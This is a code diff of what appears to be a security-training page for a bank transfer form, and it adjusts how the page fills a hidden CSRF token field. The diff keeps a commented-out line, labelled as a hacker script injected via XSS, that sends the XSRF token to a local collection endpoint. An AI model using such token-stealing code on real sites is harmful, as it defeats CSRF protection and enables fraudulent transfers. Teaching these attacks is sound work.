@@ -37,6 +37,8 @@
     function transferAmount() {
 
         console.log("xsrf: ", xsrfToken);
+
+        // $.post
         $.ajax(restEndpoint + "/transfer-rest", {
             method: "POST",
             headers: {"X-XSRF-TOKEN": xsrfToken},
@@ -55,8 +57,6 @@
 
     // hacker script injected via XSS
     //$.get("http://localhost:9999/stolenCsrf?"+xsrfToken);
-
-    $("#csrfTokenField").val(xsrfToken);
 </script>
 
 
@@ -68,10 +68,13 @@
         Recipient Full Name:<input type="text" name="recipientFullName" value="John Doe"/> <br/>
         Recipient IBAN number:<input type="text" name="recipientIban" value="12345678900"/> <br/>
         Amount:<input type="text" name="amount" value="100"/> <br/>
-        <input type="hidden" name="_csrf" id="csrfTokenField"/> <br/>
+        <input type="hidden" name="_csrf" id="csrfTokenField"/>  <br/>
         <input type="submit" value="Transfer">
     </form>
 </div>
+<script>
+    $("#csrfTokenField").val(xsrfToken);
+</script>
 
 <br/>
 <!-------------------- UPLOAD --------------------------->
